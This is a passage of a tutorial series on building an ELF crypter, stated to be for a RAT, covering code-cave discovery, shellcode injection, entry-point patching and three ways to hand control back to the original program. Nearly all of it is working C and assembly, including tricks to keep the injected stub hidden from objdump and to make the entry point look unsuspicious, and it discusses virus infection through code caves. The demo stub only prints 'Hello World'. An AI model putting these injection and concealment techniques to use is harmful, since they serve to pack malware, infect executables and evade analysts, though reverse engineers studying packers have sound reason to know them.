In the previous instalment we manage to find the relevant parts of the binary to crypt and actually crypt them. Now we need to inject our stub code and modify the binary to execute it before anything else. This gonna be fun.

A Test Stub
Instead of going with the full stub I will first introduce a very simple one so we can focus on the code injection concept. Why?. Well, this is how I actually did it. The real stuff is a relatively complex program that will have its own bugs, so we better use a program we know it works to get the code injection right and them we go for the big guy. This way, when something doesn’t work we will know it is because the code injection and not the code we are trying to inject.

So, we will go for the very basic Hello World shellcode we wrote earlier in this series. In case you do not remember those old good days, this is the code:

        global _start
_start:
        mov rax, 1          ; SYS_write = 1
        mov rdi, 1          ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13         ; count = 13 (the number of bytes to write)
        syscall             ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))

        ;;  Exit program
        mov rax, 0x3c  ; SYS_exit = 0x3c
        mov rdi, 0     ; status = 0
        syscall        ; (SYS_exit = rax (0x3c), status = rdi (0))

msg:    db 'Hello World!',0x0a
Let’s compile it and extract the machine code:

$ nasm -f elf64 -o stub-test.o stub-test.asm
$ readelf -S stub.o | grep -A1 ".text"
  [ 1] .text             PROGBITS         0000000000000000  00000180
       0000000000000031  0000000000000000  AX       0     0     16
$ dd if=stub.o count=$((0x31)) skip=$((0x180)) bs=1 | xxd -i
A quick explanation for those of you not familiar with bash and dd. First, we have to remember that readelf dumps most values in hexadecimal. So we need to convert the offset (0x180) and the size (0x31) of the .text section of our object file (that effectively contains the code of our little hello world), to decimal in order to ask dd to extract the relevant part of the binary.

You can convert them as you wish. In my case, I used a feature of bash (may not work with other shells) that allows me to use hexadecimal number in the form $((0xAAAA)).

The utility dd is really a very powerful tool, it allows to copy data over block devices or files. Let me explain the flag we had used above:

-if : This allows us to indicate our input file, that is indeed the object file we compiled with nasm.
count : Indicates how many blocks we want to read from the input file and write to the output file.
skip : Indicates how many blocks we want to skip from the input file before start reading.
bs : Allows us to indicate the block size. The default value is 512 as dd is intended to be used with disks, but we have all our values in bytes, so this is more convenient.
of: Allows us to specify the file where we want the data dumped. When omitted, dd will dump the data to stdout… which is what we really want, in order to pipe the data into xxd.
So, the command above will extract 0x31 bytes from the file stub.o starting at offset 0x180. The xxd -i is just to dump the data in a way that we can easily include in our C code. So, the output of the commands above is:

  0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
  0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05,
  0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21,
  0x0a
Which is effectively the code of our shellcode. OK, you do not have to trust me… just go and check it out:

$ objdump -d stub.o

stub.o:     file format elf64-x86-64


Disassembly of section .text:  <--- This is the section we extracted !

0000000000000000 <_start>:
   0:   b8 01 00 00 00          mov    $0x1,%eax
   5:   bf 01 00 00 00          mov    $0x1,%edi
   a:   48 8d 35 13 00 00 00    lea    0x13(%rip),%rsi        # 24 <msg>
  11:   ba 0d 00 00 00          mov    $0xd,%edx
  16:   0f 05                   syscall
  18:   b8 3c 00 00 00          mov    $0x3c,%eax
  1d:   bf 00 00 00 00          mov    $0x0,%edi
  22:   0f 05                   syscall

0000000000000024 <msg>:
  24:   48                      rex.W
  25:   65 6c                   gs insb (%dx),%es:(%rdi)
  27:   6c                      insb   (%dx),%es:(%rdi)
  28:   6f                      outsl  %ds:(%rsi),(%dx)
  29:   20 57 6f                and    %dl,0x6f(%rdi)
  2c:   72 6c                   jb     9a <msg+0x76>
  2e:   64 21 0a                and    %ecx,%fs:(%rdx)
Great. Before continuing, let’s update our crypter, adding a global variable with the code we have just extracted:

unsigned char *sc[] = {
      0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d,
      0x35, 0x13, 0x00, 0x00, 0x00, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05,
      0xb8, 0x3c, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05,
      0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21,
      0x0a
};
int  sc_len = 0x31;
Now, you see why xxd -i is so convenient.

For the final stub, you can also use this, or … well, we can do better and actually in a way that will make debugging easier. But we will get to this later.

Now is time to get our code injected!.

Injecting code in ELF binaries
There are two ways to inject code in an ELF binary… actually it is the same for any other format.

We make the binary bigger. As big as needed to fit the code we want to add.
We find a part of the file that is not used and we inject the code there :o
The second option is easier to accomplish and it is the first one we are going to try (actually this is what this instalment is about). This technique abuses what is known as code caves.

A code cave is, as you can imagine, a part of the file that is actually not used… normally you will see a lot of zeros.

Take any binary… for instance the crypter from our previous instalment and run:

 $ xxd crypter | less
Scroll down, and eventually you will find a lot of zeros… That is the code cave.

Code caves happens because the memory for the programs is allocated in pages which, for GNU/Linux, usually have a size of 4Kb. It may happen, just by chance that the size of your code is exactly a multiple of 4 Kb and… in that case there is no code cave and you need to create your own room into the binary. That is very unlikely but, what is more common is that the size of the cave may vary from a few bytes to a maximum of PAGE_SIZE - 1.

Yes. That’s the drawback. The code we can inject with this technique is limited in size and, it is even possible that it may not fit for specific binaries. Depending on the malware we are talking about, that may be critical or not.

For instance, if the malware is a virus, using this technique makes it more stealth as the size of the files don’t change, however, such a virus may not be able to infect some files… the ones with small code caves that cannot fit the virus in.

In our current case (a cryper for a RAT) it is not that critical. We can always add some extra code or data trash and get a full page for our stub code because we have the control of the program we want to crypt. Anyway, it is always better to do the things right.

In any case, I hope this helps you understand the classical claim saying that the smaller the malware the better. You cannot fit a PyInstaller binary in a code cave… And same happens with exploits and other hackish stuff.

As I said, there are other options. But let’s get started with this and explore the other later. It will also be easier for you to understand those other techniques once you master this simple one.

Finding Code Caves
So, the first thing we have to do is to find the code cave. We can use the sections to find them, but we will use instead the Program Header Table. Why?, First, it is easier and second, this is a good way to introduce the other main ELF structure the Program Header Table.

As you already know, ELF stands for Executable and Linkable Format. And the format provides structures to support those two operations. To execute a binary, and to link together object files in ELF format. And this is what the two main structures defined by the ELF format does:

The section table that we explore in the last instalment, is more useful for linking. It tell us were the data and the code are, so the linker can put together all the .text sections and all the .datasections. There is a lot more about linking but for now, this view should be enough.
The program header table that we will use in a sec is used for the execution. It tell us which memory blocks will be created in order to run the program and also which ones will be filled with the information from the disk. Note that the section table is actually not needed to execute an ELF file.
You can list the Program Header Table of any binary using readelf -l and you will usually get something like this:

$ readelf -l crypter-1.0

Elf file type is DYN (Shared object file)
Entry point 0x950
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000001f8 0x00000000000001f8  R      0x8
  INTERP         0x0000000000000238 0x0000000000000238 0x0000000000000238
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000001510 0x0000000000001510  R E    0x200000
  LOAD           0x0000000000001d50 0x0000000000201d50 0x0000000000201d50
                 0x00000000000002c0 0x00000000000002e0  RW     0x200000
  DYNAMIC        0x0000000000001d60 0x0000000000201d60 0x0000000000201d60
                 0x00000000000001f0 0x00000000000001f0  RW     0x8
  NOTE           0x0000000000000254 0x0000000000000254 0x0000000000000254
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000001384 0x0000000000001384 0x0000000000001384
                 0x000000000000004c 0x000000000000004c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000001d50 0x0000000000201d50 0x0000000000201d50
                 0x00000000000002b0 0x00000000000002b0  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00
   01     .interp
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame
   03     .init_array .fini_array .dynamic .got .data .bss
   04     .dynamic
   05     .note.ABI-tag .note.gnu.build-id
   06     .eh_frame_hdr
   07
   08     .init_array .fini_array .dynamic .got
We will go into the details of this structure in a while, but what I want you to see now is the code cave. For understanding this, there are two things you need to know.

The LOAD type are the memory blocks that will be filled with the data coming from the file. Actually the data located at the offset and size indicated for that entry
The E permission means execution, and that is the block that will contain the code. The W permission means write and those are data segment (where the program can write).
Well, usually there are two consecutive LOAD segments one containing the code and the next one containing data… and that is where our code cave will be located. Note that may be more segments for code an data, but in general there are two which are consecutive. (You can change this with a specific linker script, but that is not the normal case).

For the output above (note that in your computer the values may differ), if we dump the data between the end of the first LOAD segment (0x0000 + 0x1510) and the beginning of the next LOAD segment (0x1d50)… guess what you will get?

$  dd if=crypter-1.0 skip=$((0x1510)) count=$((0x1d50-0x1510)) bs=1 | xxd
Yes… that’s a bunch of zeros… and that empty area is where our code will be injected. For this specific binary, the code cave has a size of 0x1d50 - 0x1510 = 2128 bytes… which is pretty good, but not a lot… Just a little bit more than 2KB.

Getting to the Program Header Table
Now that we know what to look for, let’s see how do we get there. As it happened with the section table, the relevant data to find the Program Header Table is in the ELF header. I will include it again here, so you start to get to know each other:

typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	    e_phoff;		/* Program header table file offset */
  Elf64_Off	    e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;	/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;	/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */ 
} Elf64_Ehdr;
The relevant fields are:

  Elf64_Off	    e_phoff;		/* Program header table file offset */
  Elf64_Half	e_phentsize;	/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  
The e_phoff field is the offset in the file (and also in memory as we have mapped the file with mmap) where the Program Header Table can be found. Usually it is just after the header (at offset 64). The next fields tell us how many entries are in the table and the size of each entry.

Using this information, we can get to the table using a pointer as we did with the section table:

  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr*) p;
  Elf64_Shdr *sh = (Elf64_Shdr*)(p + elf_hdr->e_shoff) ;
  
  Elf64_Phdr *ph = (Elf64_Phdr*)(p + elf_hdr->e_phoff) ; // Poiner to PHT
  
Now we just need to find the segments we are interested on. For that we need to process the table.

Processing the Program Header Table
Before, unveiling what we need to do in the loop, let’s take a quick look to the Program Header Table entry structure. We can get it from /usr/include/elf.h:

typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	    p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;

Again, let me drive you through the relevant fields for our crypter:

p_type is the type of the memory block. The only type we are interested on is PT_LOAD. This actually means that the OS will load the data from the file directly into the memory block associated to this header.
p_flags contains the permissions of the header. This flags let us know if the segment will contain code (P_X permission) or will contain data (P_W permission).
p_offset is the offset within the file containing the data that will be loaded into memory for this header…
p_filesz is the size in the file of this header.
And knowing this, we can write a code like this to find the code cave:

  long ccave = 0;
  int  ccave_size = 0;
  
  for (i = 0; i < elf_hdr->e_phnum; i++) {
    if (ph[i].p_type == PT_LOAD) {
      if (ccave) {ccave_size = ph[i].p_offset - ccave; break}
      if (ph[i].p_flags & PF_X) ccave = ph[i].p_offset + ph[i].p_filesz;
    }
  }
The code just processes the LOAD sections. If you do not remember what is that, go two sections back and read again. Then we do the following:

If the current segment is executable (contains code) we assume our code cave will start at the end of it (offset + size)
Then, if we have already found the start of the code cave, the next segment we process will give us the size
NOTE: the code above needs some improvement in order to work in the general case… that is left as an exercise for the reader.

When we leave the loop we know where the code cave is and its size… Time to inject our test stub.

Injecting test code
In order to inject the code we just need to copy our shellcode (remember the one we extracted at the beginning of the article) and patch the entry point that we can find in the header.

The code should look like this:

  elf_hdr->e_entry = ccave; // New entry point is at the beginning of cave
  if (ccave_size > sc_len) {
    printf ("Injecting code at %lx\n", ccave);
    for (i = 0; i<sc_len; p[ccave+i]=sc[i],i++);
  }
Note: The code above assumes the binary is PIE (you should check for this before proceed) and then we just need to specify the offset as entry point. For non-PIE we have to provide a proper address whose base we should get from the proper Program Header Table entry.

If now we compile the crypter and we run it against other program, whenever we run that program, we will get a nice Hello World message instead of the normal behaviour… We have successfully injected code and modified the program to run our code instead of the original program.

So, we are half done. Now we need to run the original code. Let’s remember the point where we are:

Our crypter encrypts the .text and .rodata sections in the binary… so the program cannot be executed as it is in the disk
The crypter has also injected some code and patched the binary to run that code (this is exactly the point where we are)
Our code should decrypt the .text and .rodata sections, and then give control to the original entry point.
This requires a modification of our shell code. Instead of exiting the process we have to jump back to the Original Entry Point. There are a few ways to do this:

We can add a relative jump at the end of our shell code to the original entry point
We can push the original entry point address in the Stack and execute a RET instruction
We can update the memory at the original entry point to jump to the stub and the make the stub fix jump instruction before returning
Let’s start implementing them.

Relative jump to OEP
Our first option is to return control to the original program just jumping back to the original entry point (OEP). This method is straightforward and, as it uses a relative jump it will also work with PIE binaries.

Note that for static and non-PIE binaries, we can just perform an absolute jump directly to the value in the entry point field of the header, but with PIE binaries we do not know the absolute entry point address until the program starts to execute. However, a relative jump will work because the difference between both address is the same, independently of the base address randomised by the operating system when mapping the .text section.

So, the first thing we need to do is to change our shellcode. Let’s remove the exit system call, and substitute it with a relative jump that we will have to patch in our crypter. But let’s go step by step.

       global _start
_start:
        mov rax, 1    ; SYS_write = 1
        mov rdi, 1    ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13   ; count = 13 (the number of bytes to write)
        syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
to_patch:
        jmp 0x1000

msg:    db 'Hello World!',0x0a

Simple enough right?. Now we can recompile and generate the new shellcode for this stub as we did at the beginning of this instalment. You already know how to do that, but what we need is to figure out how to change the jmp offset so it ends up in the OEP.

After compiling it… let’s take a look with objdump:

(...)
0000000000000000 <_start>:
   0:   b8 01 00 00 00          mov    $0x1,%eax
   5:   bf 01 00 00 00          mov    $0x1,%edi
   a:   48 8d 35 0c 00 00 00    lea    0xc(%rip),%rsi        # 1d <msg>
  11:   ba 0d 00 00 00          mov    $0xd,%edx
  16:   0f 05                   syscall

0000000000000018 <to_patch>:
  18:   e9 fc 0f 00 00          jmpq   1019 <msg+0xffc>

000000000000001d <msg>:
(...)
As you can see, I have added a label just before the jmp so we can easily find out the offset to the jmp parameter without counting bytes :). In this case it will be 0x19 as the first e9 at 0x18 is the opcode for the jmp instruction.

So, what we have to tell jmp is to jump to the OEP. Let’s use some cool ascii art to understand this:

+-----------+
|           | 0x00    - .text segment 
~           ~ 
|           | OEP  <------------------------+ 
~           ~                               |
|           |                               | DIF = EOT + 0x19 + 4 - EOP
+-----------+ EOT (End of .text segment)    |
| stub      |                               |
| jmp       | EOT + 0x18                    |
| offset    | EOT + 0x19                    |
| next inst | EOT + 0x19 + 4 <--------------+
So, the value we are looking for is OEP - (EOT + 0x19 + 4) the extra four bytes are needed because relative jumps are calculated from the current value of the RIP that, when executing jmp is already pointing to the next instruction, just after the offset that is 4 bytes.

Let’s update our crypter and check if it works. For this test, you need to comment out the rc4 call in the crypter because we do not want the code to be crypted (our current stub won’t decrypt it). Then, add the following lines at the end:

  Elf64_Addr oep = elf_hdr->e_entry;
  // Copy shell code and patch entry point
  long val = oep - ccave - 0x19 - 4; 
  *((int*)(p+ccave + 0x19)) = val;
If you try this the program will work fine, but the original code will end with a segmentation fault. I haven’t investigated what is the actual reason. Actually, what happens in my box is that one of the destructors gets corrupted but the root cause for that I haven’t found yet. Anyway, just storing your registers in the stack before modifying them, and restoring after will make the jmp work fine. That means that one of the registers we use have some value used by the original entry point that we need to preserve. The shellcode will now look like this…

       global _start
_start:
	    push rdi
		push rsi
		push rdx
		push rax
		
        mov rax, 1    ; SYS_write = 1
        mov rdi, 1    ; fd = 1
        lea rsi, [rel msg]  ; buf = msg
        mov rdx, 13   ; count = 13 (the number of bytes to write)
        syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
		
		pop rax	
		pop rdx
		pop rsi
		pop rdi		
to_patch:
        jmp 0x1000

msg:    db 'Hello World!',0x0a

Now we need to update the offsets and shellcode in the crypter to make this work.

So far so good. Let’s go for the next case.

Returning to Original Entry Point
The second option we proposed was to return to the OEP (Original Entry Point). As we already know, when we execute the instruction RET what we actually do is jump to the address stored at the top of the stack. So we just need to push the address we want to jump to in the stack and just ret whenever we are done with our task.

This use to be that easy before PIE. PIE binaries, or Position Independent Executable are loaded in a random address every time the program is executed, so it is impossible to know, before hand at which absolute address we can find the OEP.

Even when PIE binaries are relatively new, the technique we are going to use is as old as the first stack overflow exploit. Yes, when exploiting a buffer overflow (something that is very difficult nowadays), at some point we need an absolute pointer to the area of our shell code containing our data (usually just the /bin/sh string). So the trick used by many shellcodes was to just do a call to an address a few bytes away, and place the data just after the call… Actually many times you will see a jmp to just before the data area and them a call back to the beginning of the program… It doesn’t matter the result is the same, the data absolute address gets magically in the stack:

In case you wonder, the difference between this technique and the previous one is that, with this one, we are actually getting the absolute entry point address, while the first one just use an offset but doesn’t know the exact address… Depending what you need to do you may need that value, and this is just a way to get it.

my_shellcode0:  jmp get_data
my_shellcode1:  ; The shellcode starts here
                ; Pointer to data is in the stack
				(....)
data:           call my_shellcode1
                db '/bin/sh', 0
The call at the bottom, will push the address of the next instruction, that in this case is just the address of our data. This way, when we arrive at my_shellcode1 an absolute pointer to the data is in the top of the stack ready to call execv. This is a very ingenious trick useful when you do not know your whereabouts in memory… something that use to happen with buffer overflows that has to be run on an unknown address in the stack.

We can use this very same technique to give control back to the OEP. As I said, you can implement this in many different ways. This is just one option.

	global _start
_start:
	call _start2
_start2:
    sub QWORD [rsp], 0x11223344
	push rdi
	push rsi
	push rdx
	push rax

	mov rax, 1    ; SYS_write = 1
	mov rdi, 1    ; fd = 1
	lea rsi, [rel msg]  ; buf = msg 
	mov rdx, 13   ; count = 13 (the number of bytes to write)
	syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
	pop rax	
	pop rdx
	pop rsi
	pop rdi

	ret
	
msg:	db 'Hello World!',0x0a

The code is the same than in previous case but instead of a jmp we have a ret at the very end, and the beginning just implements the trick we have just explained:

          call _start2
_start2:  sub QWORD [rsp], offset 
The call instruction just jumps to the next instruction located at _start2, at the same time that adds _start2 address to the top of the stack. Then, all we need to do is to substract to the top of the stack ([rsp]) the offset to the OEP, the same way we did with the previous technique.

Our crypter (remember to regenerate the shellcode for the new asm) will then look like this:

  long val = - (oep - ccave - 0x5) ;
  printf ("Offset : %lx \n", val);
  *((int*)(p+ccave + 0x5 + 4)) = val;
This is exactly the same we did before, but at a different offset in the shellcode… Not sure how to figure out where those numbers come from… Use objdump.

0000000000000000 <_start>:
   0:   e8 00 00 00 00          callq  5 <_start2>

0000000000000005 <_start2>:
   5:   48 81 2c 24 44 33 22    subq   $0x11223344,(%rsp)
   c:   11
The value 0x05 is the offset to the subq instruction, and the extra 4 bytes is to get to the inmediate value (0x11223344 in this case) that we actually need to patch.

Modifying entry point
This is the last technique we are going to present. They may be other options, but I believe that with this three examples you can catch the idea and work your own solutions by yourself from this point on.

The technique of modifying the entry point works as follows:

Inject your code in the code cave as usual
Store in a memory place accessible by your stub the opcodes located at the Original Entry Point
Inject a call stub_code instruction in the original entry point
In your stub code, after decrypting the original program, restore the original entry point with the stored opcodes
Adjust the return address
Just ret
Let’s see this a bit more in detail with some example. I will take just the latest version of the crypter we are just developing here, but any program may work, just be aware that the numbers in your box may be different. So, for this program, this is what I found at the original entry point (before running our crypter).

$ objdump -d crypter-1.1 | grep -A5 "<_start>:"
0000000000000900 <_start>:
     900:       31 ed                   xor    %ebp,%ebp
     902:       49 89 d1                mov    %rdx,%r9
     905:       5e                      pop    %rsi
     906:       48 89 e2                mov    %rsp,%rdx
     909:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
This is the usual _start function used by libC, you should have seen this a few times by now. Any way, the code starts doing some stuff in order to be able to call the main function. What we are gonna do is changing those instructions so, instead of doing this, it will just call our stub. We can do this just writing a call instruction at offset 0x900 (in the example above)… but that will destroy the original _start function.

To avoid this, we just copy the first 8 bytes (I’ll tell you later why 8) somewhere else so we can restore them when we are done. In this case, we need to store the bytes:

0x31 0xed 0x49 0x89 0xd1 0x5e 0x48 0x89
And change them for a call to stub. Suppose that our code cave is at 0x1928 (this is just what I get in my system, in your could be a different value), we need to inject

0000000000000900 <_start>:
     900:       e8 23 10 00 00          callq  1928 <__FRAME_END__+0x4>
We have to note a few things here:

The instruction is 5 bytes long… We could just store 5 bytes instead of 8, but it will be easier to work with 8 bytes as you will see in a sec
The parameter is an offset. In this case we want to jump to address 0x1928 whose offset from the current position is 0x1928 - 0x905 = 0x1023. When the processor executes the call instruction, the instruction pointer is already pointing to the next instruction, that is 5 bytes away from the 0x900… 5 bytes is the length of the call instruction.
So will all this, we shall be able to modify our crypter to inject our test stub at the Original Entry Point. But first we need to slightly change our stub once again.

A new stub
The first thing we have to do is to update our stub, that will have to do two things now:

First it will have to update the return address
Second it will have to restore the original _start code
As we know, when executing call, the address to the next instruction is stored in the stack. That is the address to which we want to return… But in this case we want to return to the same address from which we issued the call … because this second time the code will be different. As we said before, call requires 5 bytes. That means that we just need to substract 5 bytes to the address in the stack.

That is also the address to which we have to write back the original opcodes… which is very convenient.

With all this information, the new stub will look like:

_start2:
	push rdi
	push rsi
	push rdx
	push rax
	
	mov rax, 1    ; SYS_write = 1
	mov rdi, 1    ; fd = 1
	lea rsi, [rel msg]  ; buf = msg 
	mov rdx, 13   ; count = 13 (the number of bytes to write)
	syscall  ; (SYS_write = rax(1), fd = rdi (1), buf = rsi (msg), count = rdx (13))
	
	;; Restore original instruction
	sub QWORD [rsp + 0x20], 5
	mov rax, [rsp + 0x20]
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], rdx

	pop rax	
	pop rdx
	pop rsi
	pop rdi

	ret
	
msg:	db 'Hello World!',0x0a
All the code is the same than last time, except for the following 4 lines:

	;; Restore original instruction
	sub QWORD [rsp + 0x20], 5
	mov rax, [rsp + 0x20]
patch1:	
	mov rdx, 0x1122334455667788
	mov QWORD [rax], rdx

Some explanation is required. We access the return address after storing several registers in the stack, so we can revert all the changes before returning from our stub. As we have done 4 pushes at the beginning of the stub, our return address is now 0x20 bytes (4 time 0x08) above the current rsp value.

In principle we want to store the registers before doing anything. We can do the sub at the very beginning, but we have to first push any register we want to modify (rax in this case)… so in any case we will end up indexing on rsp at some point to get the EOP address.

Now, we just update the return address directly in the stack with the sub instruction, and then we get that value into RAX.

The next two instructions actually restore the code. The crypter will have to patch the value we introduce in RDX so it contains the original 8 bytes at _start. Then we just write it back.

As we have to write 5 bytes, it is more convenient to use this 64 bits instruction and write 8 bytes back that doing a 4 bytes write followed by a 1 byte write. It would do the same, but this looks cleaner. Also the crypter code is simpler.

Modifying the crypter
In order to make this technique work, we need to do two changes to the crypter. The first one is temporal during this testing phase. As we want to keep our shellcode as simple as possible, what we are going to do is to add the write permissions to the text segment while we look for the code cave.

In the final version, the stub will do and undo that as part of its operations, but for now, to check that we are patching correctly everything, let’s proceed this way:

So, what we need to do is a small change in the loop through the Program Header Table.

  for (i = 0; i < elf_hdr->e_phnum; i++) {
    if (ph[i].p_type == PT_LOAD) {
      printf ("PHR %d  flags: %d (offset:%ld size:%ld)\n",
	      i, ph[i].p_flags, ph[i].p_offset, ph[i].p_filesz);
      if (ccave) ccave_size = ph[i].p_offset - ccave;
	  
      if (ph[i].p_flags & PF_X) {
	     ph[i].p_flags |= PF_W; // ***** Add write permissions  *****
	     ccave = ph[i].p_offset + ph[i].p_filesz;
      }
    }
  }
Yes, that easy. Whenever we found the initial address of the code cave we just add write permissions to that segment. Otherwise, when we try to restore the original _start opcodes from our stub we will get a segmentation fault.

Next, we need to store the original instructions at the original entry point of the binary we want to crypt.

  // Store 8 bytes at current entry point
  unsigned char op[8], *ep =  p + elf_hdr->e_entry;
  for (i = 0; i < 8; op[i++]= ep[i]);
And now we can inject the call instruction:

  Elf64_Addr oep = elf_hdr->e_entry;
  //
  ep[0] = 0xe8;                          // CALL
  *((int*)&ep[1]) = ccave- oep - 5;      // Offset to sub
Finally we just need to patch the value we load in RDX in our stub. If we dump our stub code with objdump:

$ objdump -d stub5.o

stub5.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start2>:
   0:   57                      push   %rdi
   1:   56                      push   %rsi
   2:   52                      push   %rdx
   3:   50                      push   %rax
   4:   b8 01 00 00 00          mov    $0x1,%eax
   9:   bf 01 00 00 00          mov    $0x1,%edi
   e:   48 8d 35 24 00 00 00    lea    0x24(%rip),%rsi        # 39 <msg>
  15:   ba 0d 00 00 00          mov    $0xd,%edx
  1a:   0f 05                   syscall
  1c:   48 83 6c 24 20 05       subq   $0x5,0x20(%rsp)
  22:   48 8b 44 24 20          mov    0x20(%rsp),%rax

0000000000000027 <patch1>:
  27:   48 ba 88 77 66 55 44    movabs $0x1122334455667788,%rdx
  2e:   33 22 11
  31:   48 89 10                mov    %rdx,(%rax)
  34:   58                      pop    %rax
  35:   5a                      pop    %rdx
  36:   5e                      pop    %rsi
  37:   5f                      pop    %rdi
  38:   c3                      retq

0000000000000039 <msg>:
We can see that the instruction is at offset 0x27 and the values for the mov start 2 bytes later:

  // Copy codes into shellcode 
  ep = p + ccave + 0x27 + 2;
  for (i =0; i < 8; ep[i] = op[i], i++);
Note: That we can copy the original entry point opcodes directly into the stub code… I just did it in two steps so it is easier to follow.

And we are done. Now you can try this last injection technique.

The advantage of this techniques, when compared to the other two is that the entry point is not modified. In other words, having an entry point that points to the very end of the text segment is suspicious… just because compilers put the entry point at the beginning of the segment.

Conceptually all three techniques are the same… first jump to the stub, do your thing, come back to the original code. You can come up with other ways of achieving this, it all depends on the specific problem you have to solve.

Bonus
Maybe you have already noticed this, specially if you have been following the text along, but if not… Once a binary is encrypted… can you dump the stub code?

The answer is of course: yes, you can. But the way of doing it is not straightforward. If you use objdump or gdb you cannot just disassemble the stub. The reason is that we haven’t updated the section and program header tables to let these tools know that our binary is now, actually, a bit longer than before. All sections and program header sizes have been kept the same, and that is what all these tools uses to find and show code… So, for the novice eye, our crypter is completely hidden.

This is a side effect of the way we injected the code, and it just works because the kernel ELF loader just copies all the data from the disk with page size granularity… and as far as there is room, everything is OK.

This is pretty cool right?, but it makes debugging a nightmare. You can deal with this in different ways. I will just point out two options.

The first, and easier, is to just patch the size fields of your sections and program headers so all tools will just work fine with your crypted binary. Just set it up in a way that, when you are done debugging, you can just remove those lines from the final release, and make your stub invisible again to the inexperienced eye.

The other way, and this is maybe more suitable for a malware analyst trying to do a dynamical analysis, is to use gdb.

When loading one of our crypted binaries on gdb we cannot see the code either. We need to start executing the program to be able to see the stub. For our last injection code we can just add a break point in the entry point and jump into the call, that will make the stub visible.

For the first injection cases we cannot do that, because the entry point is not accessible, and we cannot figure out the final address because of the PIE thingy (actually gdb will load the binary allways in the same address so you just need to do this once, if you do not know by heart the base address it uses). Then what you can do is set a breakpoint at ‘*0’. This will start the execution of the program but will stop before running any instruction. This way we can see the memory address where the program was loaded, and now we can add a break point in the address where our stub is located and start debugging it.

Yes, this kind of things (crypters, exploits,…) are annoying to debug…

Conclusions
In this instalment we have explored different ways to inject code in a binary and make sure that we then execute the original program. We are almost done with our crypter, we just need to finish it. Actually we have already learnt a lot about virus in the way… but let’s get back to those later.

In the next instalment we will convert our rc4 algorithm to assembler and complete the stub to perform all the tasks it is suppose to do, and effectivelly finish a pretty complete crypter.
